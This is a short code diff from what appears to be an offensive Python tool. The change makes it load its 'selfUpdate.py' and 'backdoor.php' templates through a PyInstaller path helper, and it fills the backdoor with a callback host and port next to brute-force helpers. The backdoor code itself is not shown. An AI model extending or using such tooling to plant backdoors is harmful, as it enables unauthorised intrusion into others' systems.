@@ -48,10 +48,20 @@ else:
 
 frozen = getattr(sys, 'frozen', False)
 
-temporary = open('selfUpdate.py', mode='r').read()\
+def resource_path(relative_path):
+    """ Get absolute path to resource, works for dev and for PyInstaller """
+    try:
+        # PyInstaller creates a temp folder and stores path in _MEIPASS
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+
+    return os.path.join(base_path, relative_path)
+
+temporary = open(resource_path('selfUpdate.py'), mode='r').read()\
             .format(pid=os.getpid(), frozen=frozen, host=host,
                     port=port, exe=sys.executable, arg=sys.argv[0])
-backdoor = open('backdoor.php', mode='r').read()\
+backdoor = open(resource_path('backdoor.php'), mode='r').read()\
             %(host, port, sys.executable, sys.argv[0], host, port)
 
 # Bruteforce Helper funcs
